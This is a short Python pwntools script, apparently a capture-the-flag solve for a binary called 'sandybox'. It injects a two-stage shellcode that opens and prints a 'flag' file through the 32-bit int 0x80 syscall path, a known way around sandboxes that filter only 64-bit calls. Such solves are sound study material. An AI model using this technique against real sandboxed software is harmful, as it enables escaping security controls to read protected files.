#!/usr/bin/env python3
from pwn import *

context(arch="amd64")

e = "./sandybox"
r = process(e)

r.send(asm("xor rax, rax; mov rdx, r11; syscall").ljust(10, b'\x90'))	

sc = """
mov rax, 9
xor rdi, rdi
mov rsi, 64
mov rdx, 3      # PROT_READ | PROT_WRITE
mov r10, 98     # MAP_ANON | MAP_PRIVATE | MAP_32BIT
syscall         # p = mmap(NULL, 64, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_32BIT, ...)
xor rdi, rdi
mov rsi, rax
mov rdx, 64
xor rax, rax
syscall         # read(0, p, 64)
mov eax, 5
mov rbx, rsi
xor ecx, ecx
int 0x80        # fd = open(p, O_RDONLY)
mov rdi, rax
mov rsi, rbx
mov rdx, 60
xor rax, rax
syscall         # len = read(fd, p, 60)
mov rdi, 1
mov rdx, rax
mov rax, 1
syscall         # write(1, p, len)
"""

sc = asm(sc)
r.send(sc.ljust(582, b'\x90'))
r.send(b'flag\x00')
r.interactive()
